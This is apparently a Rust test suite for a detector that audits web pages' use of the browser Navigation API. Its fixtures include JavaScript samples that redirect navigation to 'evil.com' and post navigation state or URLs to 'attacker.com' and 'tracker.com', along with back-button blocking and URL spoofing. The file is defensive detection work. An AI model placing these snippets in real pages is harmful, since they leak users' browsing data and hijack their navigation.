use crate::navigation_api_audit::*;

#[test]
fn no_navigation_api_no_issues() {
    assert!(analyze_navigation_api("<html></html>").is_empty());
}

#[test]
fn detects_navigate_intercept() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            e.intercept({handler() { return fetch(e.destination.url); }});
        });
    </script>"#;
    let issues = analyze_navigation_api(body);
    assert!(issues.contains(&NavigationApiIssue::NavigateIntercepted));
    assert!(issues.contains(&NavigationApiIssue::NavigateEventUsed));
}

#[test]
fn detects_navigate_event() {
    let body = r#"<script>
        const evt = new NavigateEvent("navigate", {});
    </script>"#;
    let issues = analyze_navigation_api(body);
    assert!(issues.contains(&NavigationApiIssue::NavigateEventUsed));
}

#[test]
fn detects_current_entry() {
    let body = r#"<script>const url = navigation.currentEntry.url;</script>"#;
    let issues = analyze_navigation_api(body);
    assert!(issues.contains(&NavigationApiIssue::CurrentEntryAccess));
}

#[test]
fn detects_entries_enumerated() {
    let body = r#"<script>
        const history = navigation.entries();
        history.forEach(e => console.log(e.url));
    </script>"#;
    let issues = analyze_navigation_api(body);
    assert!(issues.contains(&NavigationApiIssue::EntriesEnumerated));
}

#[test]
fn detects_transition_while() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            e.transitionWhile(fetchNewContent());
        });
    </script>"#;
    let issues = analyze_navigation_api(body);
    assert!(issues.contains(&NavigationApiIssue::TransitionWhileUsed));
}

#[test]
fn detects_back_forward() {
    let body = r#"<script>navigation.back();</script>"#;
    let issues = analyze_navigation_api(body);
    assert!(issues.contains(&NavigationApiIssue::BackForwardIntercept));
}

#[test]
fn detects_forward() {
    let body = r#"<script>navigation.forward();</script>"#;
    let issues = analyze_navigation_api(body);
    assert!(issues.contains(&NavigationApiIssue::BackForwardIntercept));
}

#[test]
fn severity_intercept_highest() {
    assert_eq!(
        navigation_api_severity(&NavigationApiIssue::NavigateIntercepted),
        6.0
    );
}

#[test]
fn severity_current_entry_lowest() {
    assert_eq!(
        navigation_api_severity(&NavigationApiIssue::CurrentEntryAccess),
        3.5
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        NavigationApiIssue::NavigateIntercepted,
        NavigationApiIssue::EntriesEnumerated,
    ];
    let mut seq = 0;
    let ops = navigation_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        NavigationApiIssue::NavigateIntercepted.to_string(),
        "navigate_intercepted"
    );
    assert_eq!(
        NavigationApiIssue::NavigateEventUsed.to_string(),
        "navigate_event_used"
    );
    assert_eq!(
        NavigationApiIssue::CurrentEntryAccess.to_string(),
        "current_entry_access"
    );
    assert_eq!(
        NavigationApiIssue::EntriesEnumerated.to_string(),
        "entries_enumerated"
    );
    assert_eq!(
        NavigationApiIssue::TransitionWhileUsed.to_string(),
        "transition_while_used"
    );
    assert_eq!(
        NavigationApiIssue::BackForwardIntercept.to_string(),
        "back_forward_intercept"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_navigation_api("").is_empty());
}

#[test]
fn security_no_navigation_api_no_issues() {
    assert!(analyze_navigation_security("<html></html>").is_empty());
}

#[test]
fn security_empty_body() {
    assert!(analyze_navigation_security("").is_empty());
}

#[test]
fn security_detects_navigation_hijacking() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            e.intercept({
                handler() {
                    window.location.href = "https://evil.com";
                }
            });
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::NavigationHijacking));
}

#[test]
fn security_hijacking_with_redirect() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            e.intercept({
                handler() {
                    return redirect("/malicious");
                }
            });
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::NavigationHijacking));
}

#[test]
fn security_no_hijacking_without_intercept() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            console.log("navigating");
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(!issues.contains(&NavigationSecurityIssue::NavigationHijacking));
}

#[test]
fn security_detects_history_enumeration() {
    let body = r#"<script>
        const history = navigation.entries();
        history.forEach(e => console.log(e.url));
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::HistoryEnumeration));
}

#[test]
fn security_history_enum_with_key() {
    let body = r#"<script>
        const entries = navigation.entries();
        entries.map(e => e.key);
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::HistoryEnumeration));
}

#[test]
fn security_no_history_enum_without_access() {
    let body = r#"<script>
        const entries = navigation.entries();
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(!issues.contains(&NavigationSecurityIssue::HistoryEnumeration));
}

#[test]
fn security_detects_state_exfiltration_fetch() {
    let body = r#"<script>
        const state = navigation.currentEntry.state;
        fetch("https://attacker.com", {
            method: "POST",
            body: JSON.stringify(state)
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::StateExfiltration));
}

#[test]
fn security_state_exfil_xhr() {
    let body = r#"<script>
        const url = navigation.currentEntry.url;
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "https://attacker.com");
        xhr.send(url);
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::StateExfiltration));
}

#[test]
fn security_state_exfil_beacon() {
    let body = r#"<script>
        const state = navigation.currentEntry.state;
        navigator.sendBeacon("https://tracker.com", JSON.stringify(state));
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::StateExfiltration));
}

#[test]
fn security_no_exfil_without_send() {
    let body = r#"<script>
        const state = navigation.currentEntry.state;
        console.log(state);
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(!issues.contains(&NavigationSecurityIssue::StateExfiltration));
}

#[test]
fn security_detects_cross_origin_navigation() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            if (e.destination.origin !== window.origin) {
                e.intercept({handler: () => fetch(e.destination.url)});
            }
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::CrossOriginNavigation));
}

#[test]
fn security_cross_origin_with_cross_origin_keyword() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            if (e.canIntercept && e.crossOrigin) {
                e.intercept({handler: fetchHandler});
            }
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::CrossOriginNavigation));
}

#[test]
fn security_detects_back_button_disabling() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            if (e.navigationType === "back") {
                e.preventDefault();
            }
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::BackButtonDisabling));
}

#[test]
fn security_back_disable_with_intercept() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            if (history.back) {
                e.intercept({handler: () => {}});
            }
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::BackButtonDisabling));
}

#[test]
fn security_detects_url_spoofing() {
    let body = r#"<script>
        navigation.navigate("/admin");
        history.pushState({}, "", "/user");
        location.href = "/dashboard";
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::UrlSpoofing));
}

#[test]
fn security_url_spoof_replace_state() {
    let body = r#"<script>
        navigation.navigate("/secure");
        history.replaceState({}, "", "/public");
        location.href;
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::UrlSpoofing));
}

#[test]
fn security_no_spoof_without_location() {
    let body = r#"<script>
        navigation.navigate("/page");
        history.pushState({}, "", "/other");
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(!issues.contains(&NavigationSecurityIssue::UrlSpoofing));
}

#[test]
fn security_detects_form_interception() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            if (e.formData) {
                e.intercept({
                    handler() {
                        return processForm(e.formData);
                    }
                });
            }
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::FormInterception));
}

#[test]
fn security_form_intercept_with_form_keyword() {
    let body = r#"<script>
        const handleNavigate = (e) => {
            if (e instanceof NavigateEvent && e.canIntercept) {
                const form = e.form;
                e.intercept({handler: submitHandler});
            }
        };
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::FormInterception));
}

#[test]
fn security_form_intercept_submit() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            if (e.navigationType === "submit") {
                e.intercept({handler: customSubmit});
            }
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::FormInterception));
}

#[test]
fn security_detects_persistent_nav_tracking() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            localStorage.setItem("lastNav", e.destination.url);
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::PersistentNavTracking));
}

#[test]
fn security_tracking_with_getitem() {
    let body = r#"<script>
        const lastUrl = navigation.currentEntry.url;
        const prev = localStorage.getItem("nav_history");
        localStorage.setItem("nav_history", lastUrl);
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::PersistentNavTracking));
}

#[test]
fn security_no_tracking_without_storage() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            sessionStorage.setItem("temp", e.destination.url);
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(!issues.contains(&NavigationSecurityIssue::PersistentNavTracking));
}

#[test]
fn security_detects_navigation_timing() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            const start = performance.now();
            e.intercept({
                handler() {
                    const elapsed = performance.now() - start;
                    trackTiming(elapsed);
                }
            });
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::NavigationTiming));
}

#[test]
fn security_timing_with_performance_timing() {
    let body = r#"<script>
        const navStart = performance.timing.navigationStart;
        navigation.addEventListener("navigatesuccess", () => {
            const duration = Date.now() - navStart;
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::NavigationTiming));
}

#[test]
fn security_timing_date_now() {
    let body = r#"<script>
        const timestamp = Date.now();
        navigation.currentEntry;
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::NavigationTiming));
}

#[test]
fn security_detects_unauthorized_redirect() {
    let body = r#"<script>
        setTimeout(() => {
            navigation.navigate("/ads");
        }, 5000);
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::UnauthorizedRedirect));
}

#[test]
fn security_unauth_redirect_onload() {
    let body = r#"<script>
        window.onload = () => {
            navigation.navigate("/redirect");
        };
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::UnauthorizedRedirect));
}

#[test]
fn security_unauth_redirect_interval() {
    let body = r#"<script>
        setInterval(() => {
            navigation.navigate("/refresh");
        }, 60000);
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::UnauthorizedRedirect));
}

#[test]
fn security_no_redirect_with_user_action() {
    let body = r#"<script>
        button.addEventListener("click", () => {
            navigation.navigate("/page");
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(!issues.contains(&NavigationSecurityIssue::UnauthorizedRedirect));
}

#[test]
fn security_display_navigation_hijacking() {
    assert_eq!(
        NavigationSecurityIssue::NavigationHijacking.to_string(),
        "navigation_hijacking"
    );
}

#[test]
fn security_display_history_enumeration() {
    assert_eq!(
        NavigationSecurityIssue::HistoryEnumeration.to_string(),
        "history_enumeration"
    );
}

#[test]
fn security_display_state_exfiltration() {
    assert_eq!(
        NavigationSecurityIssue::StateExfiltration.to_string(),
        "state_exfiltration"
    );
}

#[test]
fn security_display_cross_origin_navigation() {
    assert_eq!(
        NavigationSecurityIssue::CrossOriginNavigation.to_string(),
        "cross_origin_navigation"
    );
}

#[test]
fn security_display_back_button_disabling() {
    assert_eq!(
        NavigationSecurityIssue::BackButtonDisabling.to_string(),
        "back_button_disabling"
    );
}

#[test]
fn security_display_url_spoofing() {
    assert_eq!(
        NavigationSecurityIssue::UrlSpoofing.to_string(),
        "url_spoofing"
    );
}

#[test]
fn security_display_form_interception() {
    assert_eq!(
        NavigationSecurityIssue::FormInterception.to_string(),
        "form_interception"
    );
}

#[test]
fn security_display_persistent_nav_tracking() {
    assert_eq!(
        NavigationSecurityIssue::PersistentNavTracking.to_string(),
        "persistent_nav_tracking"
    );
}

#[test]
fn security_display_navigation_timing() {
    assert_eq!(
        NavigationSecurityIssue::NavigationTiming.to_string(),
        "navigation_timing"
    );
}

#[test]
fn security_display_unauthorized_redirect() {
    assert_eq!(
        NavigationSecurityIssue::UnauthorizedRedirect.to_string(),
        "unauthorized_redirect"
    );
}

#[test]
fn security_severity_hijacking_highest() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::NavigationHijacking),
        8.5
    );
}

#[test]
fn security_severity_state_exfil() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::StateExfiltration),
        8.0
    );
}

#[test]
fn security_severity_form_intercept() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::FormInterception),
        7.5
    );
}

#[test]
fn security_severity_cross_origin() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::CrossOriginNavigation),
        7.0
    );
}

#[test]
fn security_severity_url_spoof() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::UrlSpoofing),
        6.5
    );
}

#[test]
fn security_severity_back_disable() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::BackButtonDisabling),
        6.0
    );
}

#[test]
fn security_severity_unauth_redirect() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::UnauthorizedRedirect),
        5.5
    );
}

#[test]
fn security_severity_history_enum() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::HistoryEnumeration),
        5.0
    );
}

#[test]
fn security_severity_tracking() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::PersistentNavTracking),
        4.5
    );
}

#[test]
fn security_severity_timing_lowest() {
    assert_eq!(
        navigation_security_severity(&NavigationSecurityIssue::NavigationTiming),
        4.0
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        NavigationSecurityIssue::NavigationHijacking,
        NavigationSecurityIssue::StateExfiltration,
    ];
    let mut seq = 0;
    let ops = navigation_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty() {
    let issues = vec![];
    let mut seq = 100;
    let ops = navigation_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 100);
}

#[test]
fn security_to_operations_increments_seq() {
    let issues = vec![
        NavigationSecurityIssue::FormInterception,
        NavigationSecurityIssue::HistoryEnumeration,
        NavigationSecurityIssue::NavigationTiming,
    ];
    let mut seq = 42;
    let ops = navigation_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 45);
}

#[test]
fn security_multiple_issues_detected() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            e.intercept({
                handler() {
                    const state = navigation.currentEntry.state;
                    fetch("https://tracker.com", {
                        method: "POST",
                        body: JSON.stringify(state)
                    });
                    window.location.href = "/redirected";
                }
            });
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::NavigationHijacking));
    assert!(issues.contains(&NavigationSecurityIssue::StateExfiltration));
    assert!(issues.len() >= 2);
}

#[test]
fn security_complex_tracking_scenario() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            const start = performance.now();
            localStorage.setItem("nav_count", parseInt(localStorage.getItem("nav_count") || "0") + 1);
            const entries = navigation.entries();
            entries.forEach(entry => {
                navigator.sendBeacon("/track", JSON.stringify({
                    url: entry.url,
                    key: entry.key,
                    timestamp: Date.now()
                }));
            });
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.contains(&NavigationSecurityIssue::HistoryEnumeration));
    assert!(issues.contains(&NavigationSecurityIssue::StateExfiltration));
    assert!(issues.contains(&NavigationSecurityIssue::PersistentNavTracking));
    assert!(issues.contains(&NavigationSecurityIssue::NavigationTiming));
    assert!(issues.len() >= 4);
}

#[test]
fn security_edge_case_only_navigation_keyword() {
    let body = r#"<script>
        const nav = "navigation.test";
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.is_empty());
}

#[test]
fn security_edge_case_navigate_event_comment() {
    let body = r#"<script>
        // NavigateEvent is used below
        const x = 1;
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.is_empty());
}

#[test]
fn security_edge_case_partial_pattern() {
    let body = r#"<script>
        navigation.addEventListener("click", (e) => {
            console.log("clicked");
        });
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert!(issues.is_empty());
}

#[test]
fn security_all_issues_unique() {
    let body = r#"<script>
        navigation.addEventListener("navigate", (e) => {
            if (e.destination.origin !== window.origin) {
                e.intercept({
                    handler() {
                        const start = performance.now();
                        if (e.formData) {
                            const data = e.formData;
                        }
                        localStorage.setItem("nav", Date.now());
                        const entries = navigation.entries();
                        entries.forEach(e => e.url);
                        fetch("/track", {body: navigation.currentEntry.state});
                        window.location.href = "/evil";
                        if (e.navigationType === "back") {
                            e.preventDefault();
                        }
                        history.pushState({}, "", "/fake");
                        location.href;
                    }
                });
            }
        });
        setTimeout(() => navigation.navigate("/auto"), 1000);
    </script>"#;
    let issues = analyze_navigation_security(body);
    assert_eq!(issues.len(), 10);
}

#[test]
fn security_clone_and_eq() {
    let issue1 = NavigationSecurityIssue::NavigationHijacking;
    let issue2 = issue1.clone();
    assert_eq!(issue1, issue2);
}

#[test]
fn security_debug_format() {
    let issue = NavigationSecurityIssue::StateExfiltration;
    let debug_str = format!("{:?}", issue);
    assert!(debug_str.contains("StateExfiltration"));
}
